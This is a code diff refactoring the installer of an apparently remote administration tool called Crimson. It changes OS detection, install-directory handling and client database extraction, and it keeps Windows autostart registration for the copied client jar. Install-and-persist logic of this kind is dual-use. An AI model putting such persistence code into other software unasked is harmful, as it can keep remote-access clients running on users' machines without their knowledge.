@@ -25,6 +25,8 @@ import java.io.InputStreamReader;
 import java.net.URISyntaxException;
 
 import com.subterranean_security.crimson.client.modules.Autostart;
+import com.subterranean_security.crimson.core.platform.Platform;
+import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.util.B64;
 import com.subterranean_security.crimson.core.util.CUtil;
@@ -34,7 +36,7 @@ public class Installer {
 	public static ClientConfig ic;
 	public static String jarPath;
 	public static String jarDir;
-	private static OSFAMILY os;
+	private static OSFAMILY os = Platform.osFamily;
 
 	private static boolean debug = new File("/debug.txt").exists();
 
@@ -49,12 +51,12 @@ public class Installer {
 		}
 
 		if (args.length > 0) {
-			try {
-				Thread.sleep(2000);
-			} catch (InterruptedException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
+		//	try {
+		//		Thread.sleep(2000);
+		//	} catch (InterruptedException e) {
+		//		// TODO Auto-generated catch block
+		//		e.printStackTrace();
+		//	}
 
 		}
 
@@ -63,6 +65,7 @@ public class Installer {
 			return;
 		}
 
+		// don't use method in CUtil because it loads Common.java
 		File temp = new File(System.getProperty("java.io.tmpdir") + "/client_" + CUtil.Misc.randString(8));
 		temp.mkdir();
 		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/lib.zip",
@@ -90,22 +93,24 @@ public class Installer {
 		}
 
 		String base = null;
-		String name = System.getProperty("os.name").toLowerCase();
-		if (name.endsWith("bsd")) {
-			os = OSFAMILY.BSD;
-			base = ic.getPathBsd();
-		} else if (name.equals("mac os x")) {
-			os = OSFAMILY.OSX;
-			base = ic.getPathOsx();
-		} else if (name.equals("solaris") || name.equals("sunos")) {
-			os = OSFAMILY.SOL;
+		switch (os) {
+		case SOL:
 			base = ic.getPathSol();
-		} else if (name.equals("linux")) {
-			os = OSFAMILY.LIN;
+			break;
+		case BSD:
+			base = ic.getPathBsd();
+			break;
+		case LIN:
 			base = ic.getPathLin();
-		} else if (name.startsWith("windows")) {
-			os = OSFAMILY.WIN;
+			break;
+		case OSX:
+			base = ic.getPathOsx();
+			break;
+		case WIN:
 			base = ic.getPathWin();
+			break;
+		default:
+			break;
 		}
 
 		if (install(base.replaceAll("\\%USERNAME\\%", System.getProperty("user.name")))) {
@@ -147,15 +152,21 @@ public class Installer {
 	public static boolean install(String base) {
 		System.out.println("Starting installation");
 
-		CUtil.Files.delete(base);
+		if (!base.endsWith(File.separator)) {
+			base += File.separator;
+		}
 
-		if (!(new File(base)).mkdirs()) {
+		File baseFile = new File(base);
+
+		if (!baseFile.exists() && !baseFile.mkdirs()) {
 			System.out.println("Failed to create install base");
 			return false;
 		}
 
-		if (!base.endsWith(File.separator)) {
-			base += File.separator;
+		for (File f : baseFile.listFiles()) {
+			if (!f.getName().equals("var")) {
+				CUtil.Files.delete(f);
+			}
 		}
 
 		(new File(base + "var")).mkdirs();
@@ -175,7 +186,9 @@ public class Installer {
 
 		System.out.println("Extracting client database");
 		File db = new File(base + "var/client.db");
-		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/client.db", db.getAbsolutePath());
+		if (!db.exists()) {
+			CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/client.db", db.getAbsolutePath());
+		}
 
 		System.out.println("Copying client jar");
 		File client = new File(base + "/client.jar");
@@ -195,7 +208,6 @@ public class Installer {
 			case LIN:
 			case OSX:
 				break;
-
 			case WIN:
 				Autostart.install_win(client);
 				break;
@@ -203,7 +215,6 @@ public class Installer {
 				break;
 
 			}
-
 		}
 
 		if (!debug) {
@@ -217,18 +228,5 @@ public class Installer {
 		}
 
 		return true;
-	}
-
-	public enum OSFAMILY {
-		BSD, OSX, SOL, LIN, WIN, UNSUPPORTED;
-
-		public String getJavaw() {
-			switch (this) {
-			case WIN:
-				return "javaw";
-			default:
-				return "java";
-			}
-		}
 	}
 }
